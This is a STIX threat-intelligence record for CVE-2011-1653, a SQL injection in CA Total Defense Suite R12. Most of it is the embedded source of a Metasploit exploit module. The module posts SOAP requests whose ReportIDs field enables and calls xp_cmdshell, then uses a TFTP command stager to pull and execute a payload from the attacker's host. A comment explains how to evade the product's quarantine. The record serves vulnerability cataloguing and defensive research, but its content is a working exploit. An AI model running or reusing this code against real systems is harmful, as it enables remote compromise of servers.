{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32b5154c-0f2a-4ff3-8062-b9dbc11dae1a",
    "created": "2024-08-14T16:51:51.846714Z",
    "modified": "2024-08-14T16:51:51.846718Z",
    "name": "CA Total Defense Suite reGenerateReports Stored Procedure SQL Injection",
    "description": " This module exploits a SQL injection flaw in CA Total Defense Suite R12. When supplying a specially crafted soap request to '/UNCWS/Management.asmx', an attacker can abuse the reGenerateReports stored procedure by injecting arbitrary sql statements into the ReportIDs element.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ca_totaldefense_regeneratereports.rb",
            "external_id": "ca_totaldefense_regeneratereports.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1653"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA Total Defense Suite reGenerateReports Stored Procedure SQL Injection',\n      'Description'    => %q{\n          This module exploits a SQL injection flaw in CA Total Defense Suite R12.\n        When supplying a specially crafted soap request to '/UNCWS/Management.asmx', an\n        attacker can abuse the reGenerateReports stored procedure by injecting arbitrary sql\n        statements into the ReportIDs element.\n\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'ZDI', '11-134' ],\n          [ 'OSVDB', '74968'],\n          [ 'CVE', '2011-1653' ],\n        ],\n      'Targets'\t=>\n        [\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'CmdStagerFlavor' => 'tftp',\n      'Privileged' => true,\n      'Platform' => 'win',\n      'DisclosureDate' => '2011-04-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(34443),\n        OptBool.new('SSL',   [ true, 'Use SSL', true ]),\n        OptString.new('CMD', [ false, 'Execute this command instead of using command stager', \"\" ])\n      ])\n  end\n\n  def windows_stager\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    tftphost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    execute_cmdstager({ temp: '.', tftphost: tftphost })\n    @payload_exe = generate_payload_exe\n\n    print_status(\"Attempting to execute the payload...\")\n    execute_command(@payload_exe)\n\n  end\n\n  def execute_command(cmd, opts = {})\n\n    #\tNOTE: This module was tested against the MS SQL Server 2005 Express bundled with\n    #\tCA Total Defense Suite R12. CA's Total Defense Suite real-time protection\n    #\twill quarantine the default framework executable payload. Choosing an alternate\n    #\texe template will bypass the quarantine.\n\n    inject = [\n        \"'') exec master.dbo.sp_configure 'show advanced options', 1;reconfigure;--\",\n        \"'') exec master.dbo.sp_configure 'xp_cmdshell',1;reconfigure;--\",\n        \"'') exec master.dbo.xp_cmdshell 'cmd.exe /c #{cmd}';--\",\n      ]\n\n    inject.each do |sqli|\n\n    soap = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap12:Body>\n    <reGenerateReports xmlns=\"http://tempuri.org/\">\n      <EnterpriseID>msf</EnterpriseID>\n      <ReportIDs>#{sqli}</ReportIDs>\n      <UserID>187</UserID>\n    </reGenerateReports>\n  </soap12:Body>\n</soap12:Envelope>\n    |\n\n    res = send_request_cgi(\n      {\n        'uri'   =>  '/UNCWS/Management.asmx',\n        'method' => 'POST',\n        'version' => '1.0',\n        'ctype' => 'application/soap+xml; charset=utf-8',\n        'data' => soap,\n      }, 5)\n\n    if ( res and res.body =~ /SUCCESS/ )\n        #print_good(\"Executing command...\")\n      else\n        fail_with(Failure::Unknown, 'Something went wrong.')\n      end\n    end\n\n  end\n\n  def exploit\n\n    unless datastore['CMD'].blank?\n      print_status(\"Executing command '#{datastore['CMD']}'\")\n      execute_command(datastore['CMD'])\n      return\n    end\n\n    case target['Platform']\n      when 'win'\n        windows_stager\n      else\n        fail_with(Failure::Unknown, 'Target not supported.')\n    end\n\n    handler\n\n  end\nend\n__END__\nPOST /UNCWS/Management.asmx HTTP/1.1\nHost: 192.168.31.129\nContent-Type: application/soap+xml; charset=utf-8\nContent-Length: length\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap12:Body>\n    <reGenerateReports xmlns=\"http://tempuri.org/\">\n      <EnterpriseID>string</EnterpriseID>\n      <ReportIDs>string</ReportIDs>\t\t<--boom!!\n      <UserID>long</UserID>\n    </reGenerateReports>\n  </soap12:Body>\n</soap12:Envelope>\n",
    "x_mitre_disclosure_date": "2011-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}